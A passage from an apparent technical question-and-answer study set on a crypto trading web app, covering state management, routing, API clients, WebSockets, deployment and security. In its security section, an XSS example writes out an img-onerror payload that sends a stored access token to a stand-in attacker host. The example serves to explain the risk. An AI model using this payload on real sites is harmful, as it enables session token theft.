**A:** **Hard delete**: Permanently removes the document from MongoDB. Simple, no storage overhead. **Soft delete**: Adds `deletedAt: ISODate` field and filters it out in queries. **Soft delete is better for a trading journal** because: (1) Users may accidentally delete important entries. Soft delete allows undo/recovery. (2) Journal entries are financial records — traders may need them for tax purposes. (3) Analytics (win rate, profit factor) should optionally exclude deleted trades. (4) Audit trail — you can see if entries were deleted. Implement by adding `deleted: false` default and filtering `{ deleted: false }` in all queries.

---

**MICRO-60.** Profit factor formula and break-even value.

**A:** `Profit Factor = Gross Profit / Gross Loss = Σ(winning trades PnL) / |Σ(losing trades PnL)|`. **Break-even = 1.0** (profits exactly equal losses). A profit factor of 2.0 means you earn $2 for every $1 lost. Professional traders target PF > 1.5. PF > 3.0 is excellent but may indicate overfitting in backtests.

---

## SECTION 12 — AI CHAT

---

**ADV-61.** How to implement LLM streaming in Flutter Web.

**A:** The backend sends `Content-Type: text/event-stream` (Server-Sent Events / SSE). In Flutter Web: use `http` package with `send()` which returns a `StreamedResponse`. Listen to `response.stream.transform(utf8.decoder)` and process each chunk. Each SSE line starts with `data: `. Parse the JSON delta, extract the text token, and append to the displayed message. The `TextField` or `Text` widget is rebuilt incrementally. Alternatively, use `dart:html`'s `EventSource` API for SSE in web. The key is to NOT use `ApiClient.instance.get()` which awaits the full response — you need a streaming reader.

---

**ADV-62.** Privacy implications of storing chat messages. Token limit management.

**A:** **Privacy**: Chat messages contain user's trading strategy, portfolio size hints, risk appetite — sensitive financial data. Storage should be: (1) encrypted at rest (MongoDB field-level encryption), (2) user-deletable (GDPR right to erasure), (3) not used for LLM training without explicit consent, (4) access-controlled so only the authenticated user can retrieve their history. **Token limit management**: GPT-4/Groq context windows are 8K–128K tokens. Full conversation history can exceed this. Strategy: (1) Keep last N messages (sliding window), (2) Summarize older messages periodically using a cheaper model, (3) Store summaries instead of full history beyond the window. The current `aiChatHistory` endpoint should return only recent messages, not the full history.

---

**MID-63.** Why Groq for chat/patterns but Anthropic Claude for Next.js AI routes?

**A:** **Groq** uses custom LPU (Language Processing Unit) hardware — extremely fast inference (100–300 tokens/sec vs ~30 for standard GPU). For chat and real-time pattern detection, speed matters more than capability. Groq's `llama-3.3-70b-versatile` is competitive with GPT-4 for structured data tasks. **Anthropic Claude** (Haiku/Sonnet) is used in Next.js for the `/api/ai/patterns` historical analysis route. Claude excels at nuanced reasoning and the response quality justifies the higher latency for a non-real-time feature. Cost: Groq is often cheaper for high-volume. The split is pragmatic: Groq for speed-critical, Claude for quality-critical.

---

**MICRO-64.** System prompt for a crypto trading AI assistant.

**A:**
```
You are CoinPilot, an AI trading assistant specializing in cryptocurrency markets.
You have expertise in technical analysis, on-chain data, market sentiment, and risk management.
Current market context: [injected dynamically].
Rules:
- Never give financial advice or tell users to buy/sell specific assets.
- Always qualify analysis with uncertainty ("this suggests", "historically").
- If asked about a specific trade, provide analysis framework, not a recommendation.
- Keep responses concise and data-driven.
- Use proper financial terminology.
```
The system prompt establishes persona, injects live market context, and adds disclaimers to manage regulatory risk.

---

## SECTION 13 — PREDICTIONS / AI ACCURACY

---

**ADV-65.** Designing a prediction scoring system beyond win rate.

**A:** Metrics that matter:
1. **Calibration**: If you say 80% confident and win 80% of those — perfectly calibrated. Poor calibration = overconfident.
2. **Brier Score**: Mean squared error of probability predictions. Lower = better. `BS = (forecast - outcome)²`.
3. **Sharpe-like ratio**: Risk-adjusted accuracy — penalize high-confidence wrong predictions more than low-confidence ones.
4. **Direction + Magnitude**: Did you predict the right direction AND was your magnitude estimate close?
5. **Time accuracy**: Did price reach your target within the predicted time window?
The AI vs User comparison should show calibration curves, not just win rate, to be meaningful.

---

**MID-66.** Full lifecycle of a prediction.

**A:**
1. **Submit**: User submits `{ coinId, direction, targetPrice, timeWindow, confidence }` → `POST /api/v1/predictions` → stored in MongoDB with `status: 'PENDING'`.
2. **Monitor**: Background cron job runs every hour → fetches current price for all PENDING predictions → checks if `targetPrice` was reached within `timeWindow`.
3. **Evaluate**: If target reached before deadline → `status: 'WON'`, records actual outcome. If deadline passed without reaching target → `status: 'LOST'`. Updates user's score.
4. **Score update**: `userId` score incremented based on confidence-weighted accuracy. Leaderboard recalculated.
5. **Post-mortem**: After evaluation, AI generates a post-mortem analysis of what happened and why the prediction was right/wrong.

---

**MICRO-67.** What is a post-mortem in trading and what does the endpoint return?

**A:** A **post-mortem** is a retrospective analysis of a completed trade or prediction — examining what happened, why, and what could be learned. The `predictionPostMortems` endpoint likely returns: the original prediction (entry, target, stop), actual price path, key events that occurred during the window (news, liquidations, funding rate changes), whether patterns aligned with the outcome, and a written AI analysis summarizing lessons. It turns every prediction into a learning opportunity.

---

## SECTION 14 — STATE MANAGEMENT (Riverpod)

---

**ADV-68.** `ChangeNotifierProvider` vs `StateNotifierProvider` vs `AsyncNotifierProvider`.

**A:**
- **`ChangeNotifierProvider`**: Uses Flutter's built-in `ChangeNotifier`. Mutable state, call `notifyListeners()` manually. Easy to migrate from `Provider`. Less testable because state mutation is in-place. Used throughout this app.
- **`StateNotifierProvider`**: Immutable state updates — returns a new state object each time. More testable (state is a plain immutable class). Clearer separation: notifier methods return new state, UI gets snapshots.
- **`AsyncNotifierProvider`**: Designed for async state. Handles loading/error/data states automatically via `AsyncValue`. No manual loading flag management. Best for data-fetching providers.
The app uses `ChangeNotifier` likely for familiarity and because it was built before `AsyncNotifierProvider` was idiomatic. Refactoring to `AsyncNotifierProvider` would eliminate the manual `_isLoading`, `_errorMessage` flags.

---

**ADV-69.** Re-render implications of monolithic ChartsNotifier.

**A:** Every `notifyListeners()` in `ChartsNotifier` rebuilds ALL widgets watching `chartsProvider`. This includes: candle data updates from socket (60× per minute at 1s ticks), pattern loading state changes, timeframe changes. `_ChartHeader` rebuilds on every candle tick even though it only needs `selectedCoin` and `timeframe`. Fix: split into `ChartDataProvider` (candles, loading, socket), `ChartUIProvider` (coin, timeframe, chart type, draw modes), `ChartPatternProvider` (pattern result, loading, error). Each provider only notifies its concerned widgets. Additionally, use `select()` to granularly watch specific fields: `ref.watch(chartsProvider.select((n) => n.selectedCoin))`.

---

**MID-70.** Why `Consumer` inside build is better than wrapping the whole widget.

**A:** In `NewListingsScreen` (original), `Consumer` was used inside `build` to rebuild only the header count and search clear button — not the entire screen. If the whole build method were in a `ConsumerWidget`, every provider change (including live price ticks from dashboard) would rebuild the entire 500-line widget tree including the heavy `SliverList`. Granular `Consumer` means only the specific subtree that depends on changed data rebuilds. This is Flutter's performance best practice — rebuild the smallest possible widget.

---

**MID-71.** `ref.watch` vs `ref.read` — difference with examples.

**A:** `ref.watch(provider)`: Subscribes to the provider. When it changes, the widget/provider rebuilds. Use inside `build()`. **Example**: `final n = ref.watch(chartsProvider);` — chart screen rebuilds whenever ChartsNotifier calls `notifyListeners()`. `ref.read(provider)`: Reads the current value once. No subscription, no rebuild. Use inside callbacks/event handlers. **Example**: `ref.read(chartsProvider).setCoin('ETH');` — in a `GestureDetector.onTap`. If you swap them: using `ref.read` in `build()` = stale data, UI never updates. Using `ref.watch` in a callback = subscribes inside a closure = memory leak + unexpected rebuilds.

---

**MICRO-72.** What does `notifyListeners()` do? Effect without state change?

**A:** `notifyListeners()` is defined in Flutter's `ChangeNotifier`. It iterates through all registered listeners (widgets watching this provider) and calls their rebuild functions — `setState()` equivalent at the provider level. If called without any state change, all watching widgets rebuild unnecessarily. The widget tree is diffed by Flutter's reconciler, so if the build output is identical, no actual pixels change. But the build method runs, which costs CPU. This is why `if (_field == value) return;` guards exist before state mutation and `notifyListeners()` — to prevent no-op rebuilds.

---

## SECTION 15 — NAVIGATION (GoRouter)

---

**ADV-73.** `ShellRoute` vs nested `GoRoute`.

**A:** `ShellRoute` wraps all child routes with a persistent shell widget (`AppShell` in this case). The shell is NOT rebuilt when navigating between child routes — it maintains its state (sidebar selection highlight, bottom nav). With nested `GoRoute`, each route would independently build the scaffold, meaning the sidebar would be a separate instance per route — state resets on navigation. `ShellRoute` is Flutter's equivalent of a persistent navigation drawer/tab bar. Without it, scrolling position, animation states, and any shell-level data would reset every route change.

---

**MID-74.** How route guards work in GoRouter.

**A:** GoRouter uses `redirect` callbacks at the route or router level. Example from this project (portfolio was guarded):
```dart
redirect: (context, state) {
  final authState = ref.read(authNotifierProvider);
  if (!authState.isLoggedIn) return '/auth/login';
  return null; // null = allow navigation
}
```
When an unauthenticated user navigates to `/portfolio`, GoRouter's redirect fires, returns `/auth/login`, and the user is redirected before the portfolio screen builds. This is checked on every navigation, including deep links and browser back/forward.

---

**MID-75.** Why `Router.neglect(context, () => context.go(route))`?

**A:** GoRouter by default adds every `context.go()` call to the browser's history stack. In the sidebar, clicking between dashboard, charts, sentiment, etc. would create a 10-entry history. Pressing back repeatedly would cycle through all visited routes before leaving the app. `Router.neglect()` tells GoRouter to perform the navigation without adding it to browser history. This is appropriate for sidebar navigation — it's equivalent to tab switching, not page navigation. Deep links still work because GoRouter initializes from the current URL.

---

**MICRO-76.** `context.go()` vs `context.push()`.

**A:** `context.go('/charts')` replaces the current location — the history entry is replaced, not pushed. Pressing back goes to wherever you came from before `go`. `context.push('/charts')` adds to the history stack — pressing back returns to the previous screen. Use `push` for drill-down navigation (list → detail). Use `go` for top-level navigation (switching main screens). In this app, `go` is correct for sidebar navigation — pressing back should exit the app or return to the previous top-level context, not cycle through every sidebar item clicked.

---

## SECTION 16 — API CLIENT & INTERCEPTORS

---

**ADV-77.** `_TokenRefreshGuard` and why `Completer` is used.

**A:** When a token expires, multiple simultaneous requests all get 401. Without a guard, each would independently try to call the refresh endpoint — sending 5+ refresh requests simultaneously. This causes: (1) race conditions (second refresh invalidates the first refresh token), (2) unnecessary backend load. `_TokenRefreshGuard` uses a `Completer<String>`: the first 401 creates the `Completer` and starts the refresh. Subsequent 401s see `_pending != null` and wait on `_pending!.future` — they queue up on the same promise. When the refresh completes, all queued requests get the new token simultaneously and retry. The `Completer` is cleared in `finally` so the next expiry starts fresh.

---

**ADV-78.** Token read from SharedPreferences first, then localStorage fallback.

**A:** On Flutter Web startup, `SharedPreferences` async initialization has not completed yet when the first API request fires (often within 100ms of app start). `html.window.localStorage` is synchronously available immediately. The fallback reads `localStorage['coinastra_access']` — the key written by Next.js's `setTokens()` in the browser. This solves a startup race condition: the first API call gets the token from localStorage synchronously while SharedPreferences is still loading asynchronously. **Risk**: localStorage is accessible to JavaScript (XSS risk as discussed). The auth token is passed in every request header — an intercepted token grants full API access until it expires.

---

**MID-79.** `ngrok-skip-browser-warning` header — what it is and should it be in production?

**A:** When serving a web app through ngrok (a tunneling tool used in development), ngrok shows an interstitial "Warning: You are visiting a site tunneled through ngrok" page on the first request. This intercepts API calls and returns HTML instead of JSON, breaking the app. Adding `ngrok-skip-browser-warning: true` header tells ngrok to skip this page. **In production**: No. This header is harmless (any server that doesn't know ngrok simply ignores it) but it signals that the code was developed with ngrok and wasn't cleaned up. It should be conditionally added only in dev mode. Left in production, it adds a tiny overhead to every request header.

---

**MID-80.** What happens if backend returns `{ success: false, data: null }` in `fetchModel`?

**A:** In `fetchModel`: `final inner = raw['data']` → `null`. `final payload = inner is Map<String, dynamic> ? inner : raw` — since `null is not Map`, it falls back to `raw` (the full response including `success: false, message: ...`). Then `fromJson(payload)` is called with `{ success: false, data: null, message: "..." }`. The model tries to parse fields from this, getting wrong data (e.g., `pattern` field returns `null` → `'—'` via `??` fallback). It should throw an `ApiException` instead. This is a silent failure bug — the app shows default/empty state without any error message.

---

**MICRO-81.** What is Dio vs `http` package?

**A:** **Dio** is a powerful HTTP client for Dart. Compared to Flutter's `http`:
1. **Interceptors**: Dio has a built-in interceptor chain (request/response/error). `http` has no native interceptor support — you must subclass `BaseClient`.
2. **Request cancellation**: Dio supports `CancelToken` to abort in-flight requests. `http` has no cancellation.
3. **Form data / multipart**: Dio has `FormData` and `MultipartFile` built-in. `http` requires manual `MultipartRequest`.
4. **Automatic JSON encoding**: Dio auto-encodes `Map` data as JSON and sets Content-Type. `http` requires manual `jsonEncode()`.
5. **Response transformers**: Dio can transform responses globally.

---

**MICRO-82.** `connectTimeout` vs `receiveTimeout`. Are 2 minutes appropriate?

**A:** `connectTimeout`: Time allowed to establish the TCP connection to the server. If the server doesn't respond within this time, throw `DioExceptionType.connectionTimeout`. `receiveTimeout`: Time allowed to receive the full response body after the connection is established. 2 minutes is **too long** for a trading app. API calls for price data, order book, or signals should complete in <5 seconds. Long timeouts mean the app appears frozen for 2 minutes on a bad request. Recommended: `connectTimeout: 10s`, `receiveTimeout: 30s`. The Groq-based pattern detection may take 3–5s, so 30s is safe. 2 minutes was likely set for development convenience with slow local servers.

---

## SECTION 17 — WEBSOCKET & REAL-TIME

---

**ADV-83.** WebSocket upgrade handshake headers.

**A:** HTTP → WebSocket upgrade:
```
Client sends:
GET /socket.io/?transport=websocket HTTP/1.1
Host: localhost:5000
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==  (random base64)
Sec-WebSocket-Version: 13

Server responds:
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=  (SHA1 of key + GUID)
```
The `101 Switching Protocols` response means the connection is now a persistent full-duplex WebSocket. The dev proxy must handle this upgrade: `server.on('upgrade', (req, socket, head) => proxy.ws(...))`. Without this, the HTTP proxy drops the connection and Socket.IO falls back to long-polling.

---

**ADV-84.** `klineStream` vs `tickerStream` — event names and client-side differentiation.

**A:** Backend emits:
- **Kline**: `socket.emit('market:kline', { symbol, interval, openTime, open, high, low, close, volume, isFinal })` — sent when a candle updates.
- **Ticker**: `socket.emit('market:ticker', [{ symbol, close, change24h, volume24h, ... }])` — bulk array of all tracked symbols, sent every 1–2 seconds.

Client differentiates via Socket.IO event name: `socket.on('market:kline', (data) → _klineController.add(...))` vs `socket.on('market:ticker', (data) → _tickerController.add(...))`. Each maps to a separate `StreamController` in `DashboardSocket`. Listeners (like `ChartsNotifier`) subscribe to the specific stream they need.

---

**MID-85.** What does `subscribeWithInterval(symbol, interval)` emit?

**A:** It emits a custom Socket.IO event to the backend — likely `socket.emit('subscribe:kline', { symbol: 'BTCUSDT', interval: '4h' })`. The backend then starts forwarding Binance WebSocket kline data for that symbol/interval pair to this specific client. When the user changes coin or timeframe, a new subscription is emitted for the new pair. The backend may also handle `unsubscribe:kline` to stop forwarding old data — or simply filter by the latest subscription per client.

---

**MICRO-86.** Socket.IO vs raw WebSockets. Long-polling fallback.

**A:** **Raw WebSocket**: Browser-native `ws://` protocol. Binary or text frames. No built-in reconnection, rooms, namespaces, or event names. **Socket.IO**: Built on top of WebSockets but adds: event-based messaging (`emit`/`on`), automatic reconnection with backoff, rooms/namespaces, acknowledgements (ack callbacks), and — crucially — **transport fallback**. If WebSockets are blocked (some corporate proxies block `ws://`), Socket.IO falls back to **HTTP long-polling**: client sends `GET /socket.io/poll`, server holds the connection open until it has data to send, then responds and the client immediately sends another request. This simulates real-time with pure HTTP. Long-polling has higher latency (~100ms vs ~10ms for WebSocket) but works everywhere.

---

## SECTION 18 — NEXT.JS API ROUTES (BFF)

---

**ADV-87.** Why auth calls go through Next.js BFF instead of direct backend calls.

**A:**
1. **Hides backend URL**: The Flutter app/browser never learns the backend URL (`crypto-backend-4557.onrender.com`). It only knows `/api/auth/*`. The backend URL can change without frontend changes.
2. **CORS control**: The backend only needs to whitelist the Next.js server IP (server-to-server), not every browser origin. This is simpler and more secure.
3. **Token management**: Next.js can set `httpOnly` cookies for tokens (future improvement) — impossible from client-side Flutter code.
4. **Rate limiting**: Next.js can add rate limiting middleware (e.g., 5 OTP requests per hour per IP) before the request reaches the backend.
5. **Response transformation**: Next.js can normalize error formats, strip sensitive fields, and add logging before responses reach the client.

---

**ADV-88.** Why not call Claude directly from the frontend? 3 reasons.

**A:**
1. **API key security**: The Anthropic API key would be exposed in the browser's network requests or JavaScript bundle. Anyone could steal it and run up charges.
2. **Data aggregation**: The `/api/ai/patterns` route fetches fear/greed, social sentiment, and trending data from the backend before calling Claude. These backend API calls would fail from the browser due to CORS.
3. **Cost control**: Server-side calls allow rate limiting, caching responses (same market conditions → same pattern analysis → serve cached result), and usage monitoring. Client-side calls give no control over how many times Claude is called.
4. **Response processing**: The route parses and validates Claude's JSON response, falls back to static data on failure, and handles errors gracefully — logic that belongs on the server.

---

**MID-89.** When is `FALLBACK_PATTERNS` used? Is it safe for financial analysis?

**A:** Fallback is used when: (1) `ANTHROPIC_API_KEY` is not set (env var missing), (2) Claude API call throws an exception, (3) Claude's response cannot be parsed as valid JSON. **Is it safe?** No, not for financial decisions. The fallback returns hardcoded BTC patterns from 2023-2024 that may be completely irrelevant to current market conditions. Showing "Oct 2024 BTC Breakout Phase — 87% similarity" when it's actually a bear market is actively misleading. Better approach: return `{ success: false, message: "Analysis temporarily unavailable" }` and show an empty state instead of fake data.

---

**MID-90.** `export const dynamic = "force-dynamic"` — what it does.

**A:** In Next.js 14 App Router, routes are statically generated at build time by default. `force-dynamic` opts the route out of static generation and forces it to run on every request (SSR). For AI analysis routes that fetch live market data (fear/greed, trending coins), static generation would cache stale data from build time. `force-dynamic` ensures every request fetches fresh data. The alternative would be `export const revalidate = 60` (ISR — regenerate every 60 seconds), which is wrong for live financial data. `force-dynamic` is the correct choice but means no CDN caching for the API response.

---

**MICRO-91.** What happens if `BACKEND_URL` is not set in production?

**A:** The code defaults to: `const BACKEND_URL = process.env.BACKEND_URL ?? "http://10.255.251.45:5000"`. In production, if the env var is not set, all Next.js API routes would try to call `http://10.255.251.45:5000` — a private LAN IP that is unreachable from a production server. Every API call would time out. The default should instead be `"https://crypto-backend-4557.onrender.com"` (the production URL) or the variable should be required with a startup-time check: `if (!process.env.BACKEND_URL) throw new Error("BACKEND_URL is required")`.

---

## SECTION 19 — SECURITY

---

**ADV-92.** 3 XSS attack vectors in Next.js that could steal localStorage tokens.

**A:**
1. **Malicious npm dependency**: A compromised package in `node_modules` adds script that reads `localStorage.getItem('coinastra_access')` and exfiltrates it. This is a supply chain attack. Mitigation: `npm audit`, Subresource Integrity.
2. **Markdown/HTML injection**: If any page renders user-supplied content (trade journal notes, AI chat) without proper sanitization, an attacker inputs `<img src=x onerror="fetch('https://evil.com?t='+localStorage.getItem('coinastra_access'))">`. If rendered as raw HTML, the token is stolen. Mitigation: always sanitize user content with DOMPurify.
3. **Open redirect + postMessage**: A phishing URL redirects to `coinastra.site/auth/login?redirect=evil.com`. After login, the app redirects to `evil.com` which receives the token via URL parameter or postMessage. Mitigation: validate redirect URLs against a whitelist.

---

**ADV-93.** Token refresh loop risk and where to break it.

**A:** If both access and refresh tokens are expired/revoked, the flow is: `401 → refresh → refresh endpoint returns 401/403 → _TokenRefreshGuard._doRefresh() throws → guard.refresh() rethrows → handler.next(err)` (falls through). The interceptor does NOT retry recursively in this case — it only retries once after a successful refresh. If the refresh itself fails, it calls `handler.next(err)` which propagates the original error. However, if there's a bug where the refresh endpoint returns a valid-looking token but it's immediately rejected, you could have retry loops. Safe guard: track refresh attempt count per request ID (via `requestOptions.extra['_retryCount']`) and only retry once.

---

**MID-94.** Security headers explained.

**A:**
- **`X-Frame-Options: DENY`**: Prevents the page from being embedded in an `<iframe>`. Protects against **Clickjacking** — where an attacker overlays a transparent iframe on a legitimate page to trick users into clicking hidden buttons (e.g., "transfer funds").
- **`X-Content-Type-Options: nosniff`**: Tells the browser not to guess (sniff) the content type of a response. Prevents **MIME sniffing attacks** where a browser interprets a JSON response as executable HTML/JS.
- **`Strict-Transport-Security (HSTS)`**: `max-age=63072000` (2 years). Tells browsers to ONLY connect via HTTPS for this domain for 2 years. Prevents **SSL stripping attacks** where an attacker downgrades HTTPS to HTTP to intercept traffic.

---

**MID-95.** How does the backend prevent direct calls to reset-password without OTP?

**A:** The backend checks `user.otpVerified === true` in the reset-password handler. If `otpVerified` is `false` (either the OTP was never submitted or it was cleared), the endpoint returns `403 Forbidden`. The `otpVerified` flag should be: (1) set to `true` only by the verified-OTP endpoint after correct OTP submission, (2) cleared after successful password reset, (3) expire after a time window (e.g., 10 minutes) — a cron job or TTL field should clear it. Without expiry, an old `otpVerified = true` state could be exploited if the backend doesn't enforce it.

---

**MICRO-96.** Full forms and which are implemented.

**A:**
- **XSS** — Cross-Site Scripting. **Risk present** (localStorage tokens).
- **CSRF** — Cross-Site Request Forgery. **Partially mitigated** (JWT Bearer token in headers; CSRF attacks work via cookies, not Authorization headers).
- **HSTS** — HTTP Strict Transport Security. **Implemented** in Next.js headers.
- **CSP** — Content Security Policy. **NOT implemented** (no `Content-Security-Policy` header in `next.config.mjs`).
- **MFA** — Multi-Factor Authentication. **NOT implemented** (only OTP for account actions, not for every login).

---

## SECTION 20 — DEPLOYMENT & DEVOPS

---

**ADV-97.** Risks of committing Flutter build artifacts.

**A:**
1. **Repository bloat**: `main.dart.js` is 2–4MB. Over 100 deploys, the git history stores hundreds of MB of binary diffs. Git is not designed for binary files — diffs are meaningless and storage grows linearly.
2. **Git conflicts**: Two developers who both rebuild Flutter and push will create merge conflicts on large binary files that cannot be auto-resolved.
3. **False sense of deployment**: The build in git may not match the source code if someone pushes source without rebuilding first.
4. **Security**: Build artifacts may contain embedded constants (API endpoint URLs, environment defaults) that reveal infrastructure details.
Better approach: CI/CD (GitHub Actions) builds Flutter and deploys directly — never commit build artifacts.

---

**ADV-98.** Multi-stage Docker build — why and size difference.

**A:** **Why multi-stage**: The Flutter SDK + Dart SDK + build tools in `ghcr.io/cirruslabs/flutter:stable` is ~2GB. Without multi-stage, the final image would include all build tools that are not needed at runtime. Multi-stage: Stage 1 (`builder`) uses the Flutter image to compile to HTML/JS/CSS. Stage 2 (`runner`) uses `nginx:alpine` (~5MB) and only copies the compiled `build/web` output. **Size difference**: Single-stage ≈ 2.1GB. Multi-stage ≈ 15MB (nginx:alpine + ~5MB of Flutter web assets). The 140× size reduction means faster image pulls, less storage cost, and a smaller attack surface.

---

**MID-99.** `profiles: [production]` in docker-compose.

**A:** Docker Compose profiles allow you to define services that are not started by default. With `profiles: ["production"]`, the `nginx` service is excluded from `docker-compose up` (development) and only included when explicitly activating the profile: `docker-compose --profile production up`. In development, you access Next.js on `:3000` and Flutter on `:5000` directly. In production, Nginx runs on `:80`/`:443` and proxies to both. This prevents accidentally running the production Nginx config locally where SSL certs may not exist.

---

**MID-100.** What happens if Flutter build fails in `concurrently`?

**A:** `concurrently` by default does NOT kill other processes when one fails. It continues running Next.js and the proxy even if Flutter crashes. The behavior depends on flags: `--kill-others` kills all processes when any one exits. `--kill-others-on-fail` kills all processes only when one fails (non-zero exit). Without these flags, developers may not notice Flutter failed and assume the app is running — but the Flutter UI at port 5001 will be unavailable. The root `package.json` does not use these flags, so a Flutter build failure is silent. Recommended: add `--kill-others-on-fail` to the `dev` script.

---

**MICRO-101.** Port assignments in dev.

**A:**
- **Next.js**: `:3000`
- **Flutter**: `:5001`
- **Dev Proxy**: `:8080` ← **Open this in your browser**
- **Backend**: `:5000` (local LAN IP `10.255.251.45:5000` or `localhost:5000`)

---

## SECTION 21 — PERFORMANCE

---

**ADV-102.** Flutter Web bundle size reduction strategies. Tree-shaking icons.

**A:** Flutter build strategies: (1) **Tree-shaking**: Dart compiler removes unused code. `--release` enables aggressive tree-shaking. (2) **Deferred loading**: Split app into deferred libraries loaded on demand (`import 'package:x' deferred as x`). (3) **CanvasKit vs HTML renderer**: CanvasKit WASM (~2MB) vs HTML renderer (~200KB) — trade-off between fidelity and size. **Icon tree-shaking**: Flutter parses all `Icon(Icons.xxx)` references in source code at build time. It identifies only the glyphs actually used and generates a subset font. `MaterialIcons-Regular.otf` went from 1.6MB (1,400+ icons) to 19KB (only the ~20 icons actually used). This is automatic but only works with static icon references — dynamic icon selection (e.g., `Icon(myVariableIcon)`) prevents tree-shaking for those icons.

---

**ADV-103.** Cache strategy for `/app/canvaskit/` and `/app/assets/`.

**A:** `Cache-Control: public, max-age=31536000, immutable`. `max-age=31536000` = 1 year. `immutable` tells browsers and CDNs: "This resource will never change at this URL — don't even bother checking for updates (no conditional GET with If-None-Match)." This is safe because Flutter's build system content-hashes filenames — `canvaskit.wasm?v=abc123`. When content changes, the URL changes, so the old cached version is never served stale. New deployments generate new hash suffixes, bypassing the cache. Without `immutable`, browsers send `If-None-Match` requests every session — unnecessary round trips for files that won't change.

---

**MID-104.** `NeverScrollableScrollPhysics` inside `SingleChildScrollView` with `GridView`.

**A:** `GridView` is itself scrollable. Nesting a scrollable inside another scrollable causes Flutter to throw "Vertical viewport was given unbounded height." `NeverScrollableScrollPhysics` disables the GridView's own scrolling, making it render at its full height (non-lazy). The outer `SingleChildScrollView` handles all scrolling. The trade-off: with `shrinkWrap: true` + `NeverScrollableScrollPhysics`, ALL grid items are rendered immediately (no lazy loading). For the More sheet with ~15 items, this is fine. For large lists (100+ items), this would be slow — use a proper `CustomScrollView` with `SliverGrid` instead.

---

**MICRO-105.** What is CanvasKit? Alternative and trade-offs.

**A:** **CanvasKit** is a WebAssembly build of Skia (Google's 2D graphics engine, same used in Chrome). Flutter Web uses it to render pixel-perfect Flutter widgets via WebGL, giving identical appearance to native Flutter. **Alternative: HTML renderer** — Flutter generates standard HTML/CSS/SVG elements instead. **Trade-offs**:
| | CanvasKit | HTML Renderer |
|---|---|---|
| Bundle size | +2MB WASM | Minimal |
| Performance | High (GPU) | Lower |
| Text rendering | Pixel-perfect | Uses browser fonts |
| Accessibility | Limited | Full browser a11y |
| Load time | Slower (WASM parse) | Faster |
This app uses CanvasKit for chart rendering fidelity — candlestick charts require precise pixel rendering.

---

## SECTION 22 — COMING SOON FEATURES

---

**ADV-106.** Feature flag vs comment-out approach. Drift risk.

**A:** **Comment-out approach** (used here): Simple. The code is visible, preserved, zero runtime cost. **Risk**: If `NewListingsProvider` adds new fields or changes existing ones while the screen is commented out, the screen code silently drifts — it may not compile when uncommented without significant work. **Feature flag approach**: `if (FeatureFlags.newListings) return NewListingsScreen() else return ComingSoonScreen()`. The original screen continues to compile (Dart analyzer checks it), preventing drift. Flag can be toggled per user (A/B testing), per environment, or remotely via a config service. For a team project, feature flags are strongly preferred — comment-out is acceptable for solo development with a clear timeline.

---

**MID-107.** Token vesting in crypto. Why unlock events are bearish.

**A:** **Vesting**: Early investors, team members, and advisors receive tokens at project launch but cannot sell them immediately — they "vest" (unlock) gradually over 1–4 years to align incentives. A typical schedule: 1-year cliff (nothing unlocks for 12 months), then 25% per year for 3 years. **Why bearish**: When large quantities of tokens become sellable, insiders who received tokens at near-zero cost often sell to realize profit. A $50M unlock represents potential selling pressure. The price often drops in anticipation (days before the unlock) as traders short the token. The impact is larger for: high % of supply unlocking, tokens held by VCs (who are profit-motivated sellers), and tokens with low trading volume relative to unlock size.

---

**MICRO-108.** What happens if user navigates directly to `/portfolio` URL?

**A:** The route exists in GoRouter (not removed, just removed from navigation). Direct URL navigation to `/portfolio` would render `PortfolioScreen` — it is not deleted. Since portfolio was removed from nav but not from the router, it remains accessible via direct URL. This may or may not be intended. If the auth guard was on the route, an unauthenticated user gets redirected to login. An authenticated user reaches the portfolio screen. To fully disable: either remove the route from `router.dart` (returns 404) or keep it but add a redirect to `/dashboard`.

---

## BONUS — SYSTEM DESIGN

---

**ADV-109.** Design a real-time alert system: "Alert me when BTC drops 5% in 1 hour."

**A:**
**Storage** (MongoDB):
```json
{ userId, symbol: "BTCUSDT", type: "PERCENT_CHANGE",
  value: -5, window: "1h", status: "ACTIVE", createdAt }
```
**Backend monitoring**:
- WebSocket price stream already running (Binance) feeds a price cache (Redis).
- Alert evaluator runs every 60 seconds: for each ACTIVE alert, fetch price 1 hour ago from Redis sorted set, compute % change, if threshold breached → trigger.
**Delivery to Flutter**:
- Backend emits `alert:triggered` via Socket.IO to the user's socket room (`userId`).
- Flutter `DashboardSocket` listens for `alert:triggered` → shows in-app notification banner.
- Also send push notification via Firebase Cloud Messaging for background alerts.
**Deduplication**: Set `status: "TRIGGERED"` immediately on fire. 60s re-evaluation avoids duplicate triggers.

---

**ADV-110.** Offline-first architecture for the dashboard.

**A:**
**What to cache**: Last fetched market prices, last 100 candles for watched coins, fear/greed index, portfolio snapshot. NOT: order book (stale depth data is dangerous), AI signals (stale signals are dangerous).
**Storage in Flutter Web**: `localStorage` (via `shared_preferences` web adapter) for small JSON blobs. `IndexedDB` (via `sembast_web` or `hive`) for larger candle arrays.
**Implementation**: Wrap each provider's `loadData()` with cache-aside pattern: (1) Read from cache immediately → show stale data with "Last updated X min ago" badge. (2) Fetch from network in background. (3) On success, update cache + UI. (4) On failure, keep showing cached data + show "Offline" banner.
**Reconnection**: Listen to `window.ononline` event → automatically re-fetch all stale data → clear "Offline" state.

---

**ADV-111.** Caching strategy for detect-pattern at scale.

**A:**
**Load estimate**: 1000 users × 1 request × ~3319 tokens = 3.3M tokens per minute. At Groq's pricing (~$0.05/1M tokens), that's $0.16/min = $240/day. Response time ~2s each.
**Caching approach**: The pattern depends on `symbol + timeframe + candle hash`. Two users watching BTCUSDT on 4H see nearly identical candles (same market). Cache key: `MD5(symbol + timeframe + last_close_timestamp)`. Since the candle data only changes every 4 hours (on 4H timeframe), the cache TTL should be 4 hours. Store in Redis with `SETEX detect-pattern:{key} 14400 {result_json}`.
**Cache hit flow**: Hash the request → check Redis → if hit, return in <10ms instead of 2s. Expected cache hit rate: >95% for popular pairs (BTC, ETH) during busy periods. Save ~95% of Groq API costs and improve response time 200×.
**Cache miss**: Forward to Groq, store result, return. Add `X-Cache: HIT/MISS` header for monitoring.

---

*End of question set — 111 questions + answers across 22 sections.*
